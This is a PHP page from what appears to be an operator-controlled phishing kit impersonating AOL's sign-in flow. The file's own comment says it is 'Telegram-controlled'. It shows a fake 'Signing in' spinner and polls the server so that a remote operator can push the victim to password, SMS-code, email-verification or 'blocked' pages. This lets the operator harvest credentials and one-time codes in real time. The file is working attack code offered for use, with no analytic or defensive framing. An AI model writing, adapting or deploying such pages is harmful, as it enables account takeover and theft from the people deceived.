<?php
// loading.php — AOL Loading screen, Telegram-controlled
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }
$sid   = $_SESSION['visitor_id'] ?? session_id();
$state = get_state($sid);
if ($state['page'] === 'success') {
    header('Location: ' . SUCCESS_URL);
    exit;
}

page_open('Signing in - AOL', true);
?>

<div class="card" style="text-align:center">
  <div class="card-aol-logo">Aol.</div>
  <div style="height:1px;background:#e8e8e8;margin:20px 0"></div>
  <div class="loading-wrap">
    <div class="aol-spinner"></div>
    <p style="font-size:15px;font-weight:600;color:#1a1a1a">Please wait...</p>
    <p style="font-size:13px;color:#777">Do not close or refresh this page</p>
  </div>
</div>

<script>
(function(){
  const MAP = {
    'pw_error':     'password.php',
    'password':     'password.php',
    'sms_verify':   'sms-verify.php',
    'email_verify': 'email-verify.php',
    'blocked':      'blocked.php',
  };
  let redirecting = false;
  function poll(){
    if (redirecting) return;
    fetch('poll.php?t='+Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (redirecting) return;
        if (d.page === 'loading') return;
        if (d.page === 'success') {
          redirecting = true;
          window.location.replace('<?= SUCCESS_URL ?>');
          return;
        }
        const dest = MAP[d.page];
        if (dest) { redirecting = true; window.location.replace(dest); }
      }).catch(()=>{});
  }
  setInterval(poll, 1200);
  poll();
})();
</script>

<?php page_close(); ?>